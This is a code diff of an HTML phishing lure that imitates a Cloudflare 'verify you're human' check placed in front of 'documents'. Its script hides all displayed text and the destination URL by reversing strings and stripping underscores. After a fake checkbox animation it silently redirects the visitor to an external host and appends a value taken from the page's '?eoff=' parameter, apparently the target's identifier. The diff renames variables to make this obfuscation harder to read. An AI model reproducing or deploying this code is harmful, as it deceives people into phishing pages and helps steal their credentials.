@@ -3,81 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <style>
-        body { margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fcfcfc; font-family: 'Segoe UI', Arial, sans-serif; }
-        #stage { display: flex; flex-direction: column; align-items: center; }
-        .p-pulse { width: 85px; animation: br 2.2s ease-in-out infinite; }
-        @keyframes br { 0%, 100% { opacity: 0.4; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
-        .v-card { background: #fff; border: 1px solid #d0d0d0; width: 370px; padding: 24px 32px; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
-        .v-left { display: flex; align-items: center; gap: 16px; flex: 1; }
-        #c-box { width: 22px; height: 22px; border: 2px solid #bcbcbc; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
-        .v-rot { width: 14px; height: 14px; border: 2px solid #eee; border-top: 2px solid #0052cc; border-radius: 50%; animation: s 0.8s linear infinite; }
-        @keyframes s { 100% { transform: rotate(360deg); } }
-        .v-right { border-left: 1px solid #f2f2f2; padding-left: 20px; text-align: center; }
-        .v-logo { width: 26px; height: 26px; margin-bottom: 2px; }
+        body{margin:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;background:#fcfcfc;font-family:'Segoe UI',Arial,sans-serif}
+        #stage{display:flex;flex-direction:column;align-items:center}
+        .p-pulse{width:85px;animation:p_a 2.2s ease-in-out infinite}
+        @keyframes p_a{0%,100%{opacity:.4;transform:scale(.95)}50%{opacity:1;transform:scale(1.05)}}
+        .v-card{background:#fff;border:1px solid #d0d0d0;width:370px;padding:24px 32px;display:flex;justify-content:space-between;align-items:center;border-radius:5px;box-shadow:0 4px 12px rgba(0,0,0,.03)}
+        .v-left{display:flex;align-items:center;gap:16px;flex:1}
+        #c-box{width:22px;height:22px;border:2px solid #bcbcbc;border-radius:2px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .v-rot{width:14px;height:14px;border:2px solid #eee;border-top:2px solid #0052cc;border-radius:50%;animation:p_s 0.8s linear infinite}
+        @keyframes p_s{100%{transform:rotate(360deg)}}
+        .v-right{border-left:1px solid #f2f2f2;padding-left:20px;text-align:center}
+        .v-logo{width:26px;height:26px;margin-bottom:2px}
     </style>
 </head>
 <body>
-
     <div id="stage"></div>
-
     <script>
-        (function() {
-            // Unmasking logic: Reverse and Strip
-            const _cln = (x) => x.split('').reverse().join('').replace(/_/g, '');
+        (function(){
+            const _k0x1 = (s) => s.split('').reverse().join('').replace(/_/g, '');
+            const _v1 = _k0x1('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
+            const _v2 = _k0x1('y_f_i_r_e_V');
+            const _v3 = _k0x1('._._._g_n_i_y_f_i_r_e_V');
+            const _v4 = _k0x1('s_s_e_c_c_u_S');
+            const _v5 = _k0x1('e_r_a_l_f_d_u_o_l_C');
+            const _v6 = _k0x1('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
+            const _vU = _k0x1('#_5_b_C_a_I_q_W_E_0_r_0_f_H_K_g_t_/_1_v_/_i_p_a_/_e_n_i_l_n_o_._e_a_u_n_f_f_i_t_._v_n_i_f_f_o_/_/:_s_p_t_t_h');
+            const _vK = _k0x1('=__f__f__o__e__?__/__');
+            const _dom = document.getElementById('stage');
 
-            // All text strings scrambled
-            const _m1 = _cln('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
-            const _m2 = _cln('y_f_i_r_e_V');
-            const _m3 = _cln('._._._g_n_i_y_f_i_r_e_V');
-            const _m4 = _cln('s_s_e_c_c_u_S');
-            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // Cloudflare
-            const _m6 = _cln('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
-
-            // UPDATED REDIRECT URL
-            const _mU = _cln('#_5_b_C_a_I_q_W_E_0_r_0_f_H_K_g_t_/_1_v_/_i_p_a_/_e_n_i_l_n_o_._e_a_u_n_f_f_i_t_._v_n_i_f_f_o_/_/:_s_p_t_t_h');
-
-            const _mK = _cln('=__f__f__o__e__?__/__'); // "/?eoff="
-
-            const view = document.getElementById('stage');
-            // astro.png: Preloader
-            view.innerHTML = `<img src="astro.png" class="p-pulse">`;
+            _dom.innerHTML = '<img src="astro.png" class="p-pulse">';
 
             setTimeout(() => {
-                view.innerHTML = `
-                    <div style="color:#666;font-size:13.5px;margin-bottom:12px;">${_m1}</div>
-                    <div class="v-card">
-                        <div class="v-left">
-                            <div id="c-box"></div>
-                            <span id="v-lbl" style="color:#444;font-size:14px;">${_m2}</span>
-                        </div>
-                        <div class="v-right">
-                            <img src="astro2.png" class="v-logo">
-                            <div style="font-weight:600;font-size:14px;color:#1a1a1a;">${_m5}</div>
-                            <div style="font-size:9px;color:#aaa;margin-top:2px;">${_m6}</div>
-                        </div>
-                    </div>`;
+                _dom.innerHTML = '<div style="color:#666;font-size:13.5px;margin-bottom:12px;">' + _v1 + '</div>' +
+                    '<div class="v-card"><div class="v-left"><div id="c-box"></div>' +
+                    '<span id="v-lbl" style="color:#444;font-size:14px;">' + _v2 + '</span></div>' +
+                    '<div class="v-right"><img src="astro2.png" class="v-logo">' +
+                    '<div style="font-weight:600;font-size:14px;color:#1a1a1a;">' + _v5 + '</div>' +
+                    '<div style="font-size:9px;color:#aaa;margin-top:2px;">' + _v6 + '</div></div></div>';
 
                 document.getElementById('c-box').onclick = function() {
-                    const b = this;
-                    const l = document.getElementById('v-lbl');
-                    b.onclick = null;
-                    b.style.border = "none";
-                    b.innerHTML = '<div class="v-rot"></div>';
-                    l.innerText = _m3;
+                    const _b = this;
+                    const _l = document.getElementById('v-lbl');
+                    _b.onclick = null;
+                    _b.style.border = "none";
+                    _b.innerHTML = '<div class="v-rot"></div>';
+                    _l.innerText = _v3;
 
                     setTimeout(() => {
-                        b.innerHTML = '<span style="color:#228b22;font-weight:bold;font-size:18px;">\u2713</span>';
-                        l.innerText = _m4;
-                        l.style.color = '#28a745';
-
-                        const u = window.location.href;
-                        let p = "";
-                        if (u.includes(_mK)) {
-                            p = u.split(_mK)[1];
+                        _b.innerHTML = '<span style="color:#228b22;font-weight:bold;font-size:18px;">\u2713</span>';
+                        _l.innerText = _v4;
+                        _l.style.color = '#28a745';
+                        let _p = "";
+                        if (window.location.href.includes(_vK)) {
+                            _p = window.location.href.split(_vK)[1];
                         }
-
                         setTimeout(() => {
-                            window.location.replace(_mU + p);
+                            window.location.replace(_vU + _p);
                         }, 1250);
                     }, 2200);
                 };
